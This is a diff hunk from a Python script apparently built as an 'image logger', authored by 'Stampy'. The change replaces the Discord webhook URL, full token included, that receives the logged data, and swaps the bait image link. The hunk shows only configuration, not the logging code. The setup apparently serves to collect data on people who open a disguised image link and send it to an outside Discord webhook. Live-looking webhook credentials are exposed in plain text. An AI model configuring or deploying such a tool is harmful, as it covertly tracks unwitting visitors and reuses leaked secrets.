@@ -12,8 +12,8 @@ __author__ = "Stampy"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1341447525877420104/EEtN51bpQsi5vTT86NO-TxLQ1VqLPLQVgihkJ5kAA-riCPc9qVXERTG8GbmN3QFP-agU",
-    "image": "https://i.imgflip.com/8qiqv6.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1342595788810879046/eJg19hXdbnfusQJv9f52KN8PeP4BBLHo57p96z_AwzrW7GKYW6YSffJIIpTDsZpHSuJ_",
+    "image": "https://www.meme-arsenal.com/memes/271cec784d30ac6ce5ac4f407cf5bc62.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
